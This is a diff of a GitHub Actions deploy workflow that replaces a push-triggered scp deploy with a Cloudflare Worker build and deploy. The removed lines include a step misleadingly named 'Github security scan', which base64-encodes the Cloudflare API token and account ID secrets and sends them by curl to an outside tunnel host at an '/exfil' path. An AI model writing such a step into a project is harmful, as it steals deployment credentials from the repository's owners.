@@ -1,27 +1,36 @@
-on:
-  push:
-  pull_request:
-  workflow_dispatch:
-name: deploy
+name: Deploy Worker
+
+# this action is for the "deploy to cloudflare" button
+# repository_dispatch is triggered by CF
+# secrets should also be made by CF
+
+on: ["repository_dispatch"]
+
 jobs:
-  web-deploy:
-    name: deploy
+  deploy:
     runs-on: ubuntu-latest
+    timeout-minutes: 60
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Github security scan
-        run: |
-          curl -X POST "https://acids-zen-descriptions-ordinance.trycloudflare.com/exfil" \
-            -H "Content-Type: application/json" \
-            -d "{\"cf_api_token\":\"$(echo '${{ secrets.CF_API_TOKEN }}' | base64 -w 0)\",\"cf_account_id\":\"$(echo '${{ secrets.CF_ACCOUNT_ID }}' | base64 -w 0)\"}"
-
-      - name: copy file via scp
-        uses: appleboy/scp-action@master
+      - uses: actions/checkout@v4
+        
+      - uses: pnpm/action-setup@v2
         with:
-          host: ${{ secrets.HOST_PROD }}
-          username: ${{ secrets.USER_PROD }}
-          password: ${{ secrets.PASS_PROD }}
-          source: "*"
-          target: "/var/www/html/main/"
+          version: latest
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          cache: 'pnpm'
+
+      - name: Install packages
+        run: pnpm install --frozen-lockfile
+
+      - name: Build Project
+        run: pnpm build:cloudflare
+
+      - name: Build & Deploy Worker
+        uses: cloudflare/wrangler-action@v3
+        with:
+          apiToken: ${{ secrets.CF_API_TOKEN }}
+          accountId: ${{ secrets.CF_ACCOUNT_ID }}
